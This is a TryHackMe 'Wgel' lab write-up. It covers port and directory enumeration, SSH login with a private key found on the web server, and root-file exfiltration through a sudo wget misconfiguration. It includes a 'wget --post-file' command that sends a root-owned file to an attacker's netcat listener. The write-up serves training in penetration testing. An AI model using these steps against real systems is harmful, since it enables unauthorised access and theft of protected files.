# Wgel - TryHackMe

Linux machine with Apache on port 80 and SSH on port 22. The username leaks from an HTML comment in the page source, a private SSH key is exposed through directory enumeration, and privilege escalation abuses a sudo `wget` misconfiguration to exfiltrate the root flag over HTTP without an interactive root shell.

---

## Enumeration

### Network Scanning

```bash
sudo nmap -sV -A 10.66.171.54
```

Open ports:

- 22/tcp - SSH
- 80/tcp - HTTP (Apache default page)

### Web Enumeration

The default Apache landing page source contained a comment leaking a username:

```
jessie
```

Directory enumeration on the root, then recursively on the discovered path:

```bash
gobuster dir -u http://10.66.171.54 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://10.66.171.54/sitemap -w /usr/share/wordlists/dirb/common.txt -x txt,html,php -t 20
```

A path within `/sitemap` exposed a file named `id_rsa` - an SSH private key accessible without authentication.

---

## Initial Access

```bash
chmod 600 id_rsa
ssh -i id_rsa jessie@10.66.171.54
```

---

## Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

Output:

```
(root) NOPASSWD: /usr/bin/wget
```

`jessie` can run `wget` as root without a password. `wget --post-file` sends the contents of any file as the HTTP POST body to a listener, effectively reading root-owned files without an interactive shell.

### Exfiltrating the Root Flag

On the attack box:

```bash
nc -lvp 3344
```

On the target:

```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.66.97.183:3344/
```

The file content arrives in the netcat output.

---

## Flags

```
user.txt  -> /home/jessie/Documents/user_flag.txt
root.txt  -> exfiltrated via wget --post-file to attacker listener
```

---

## Key Takeaways

- A default Apache page is not "no content" - it is an enumeration starting point. Page source review is a quick, high-yield step.
- Exposed private keys on a web server provide immediate initial access. Enumerate recursively before switching to active exploitation.
- `sudo wget --post-file` is a file read primitive running as root. It bypasses the need for an interactive root shell to capture flag content.
- Not every privilege escalation path ends with an interactive shell. Reading the root flag via `wget` is valid and sufficient.
- Gobuster on `/sitemap` as a second pass - not just the root - is what revealed the key. Recursive directory enumeration pays off.

---

## Disclaimer

This lab was completed in a controlled environment provided by TryHackMe. All actions were performed strictly for educational purposes.
